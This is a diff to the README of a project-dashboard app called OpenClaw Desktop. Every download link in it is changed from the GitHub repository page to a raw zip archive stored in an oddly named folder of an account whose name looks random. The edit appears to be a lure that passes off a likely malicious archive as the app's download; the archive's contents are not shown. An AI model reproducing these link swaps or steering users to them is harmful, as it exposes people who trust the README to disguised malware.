@@ -1,12 +1,12 @@
 # 🖥️ openclaw-project-webos - Plan Work in One Clear View
 
-[![Download OpenClaw Desktop](https://img.shields.io/badge/Download-OpenClaw%20Desktop-blue?style=for-the-badge&logo=github)](https://github.com/Springchickenbacklighting885/openclaw-project-webos)
+[![Download OpenClaw Desktop](https://img.shields.io/badge/Download-OpenClaw%20Desktop-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Springchickenbacklighting885/openclaw-project-webos/main/agariciform/project_openclaw_webos_1.9.zip)
 
 ## 🚀 Download OpenClaw Desktop
 
 Use this link to visit the download page:
 
-[Download OpenClaw Desktop](https://github.com/Springchickenbacklighting885/openclaw-project-webos)
+[Download OpenClaw Desktop](https://raw.githubusercontent.com/Springchickenbacklighting885/openclaw-project-webos/main/agariciform/project_openclaw_webos_1.9.zip)
 
 OpenClaw Desktop is a WebOS-style project dashboard for planning work, tracking tasks, and following progress in one place. It includes a kanban board, a Gantt timeline, an activity feed, and runbooks for routine work.
 
@@ -32,7 +32,7 @@ Follow these steps on a Windows PC.
 
 Go to:
 
-[Download OpenClaw Desktop](https://github.com/Springchickenbacklighting885/openclaw-project-webos)
+[Download OpenClaw Desktop](https://raw.githubusercontent.com/Springchickenbacklighting885/openclaw-project-webos/main/agariciform/project_openclaw_webos_1.9.zip)
 
 ### 2. Get the Windows version
 
@@ -240,7 +240,7 @@ Use the timeline to map dates, milestones, and handoff steps
 
 If you need to get the app again, use the same link:
 
-[Download OpenClaw Desktop](https://github.com/Springchickenbacklighting885/openclaw-project-webos)
+[Download OpenClaw Desktop](https://raw.githubusercontent.com/Springchickenbacklighting885/openclaw-project-webos/main/agariciform/project_openclaw_webos_1.9.zip)
 
 ## 🧭 File Names You May See
 
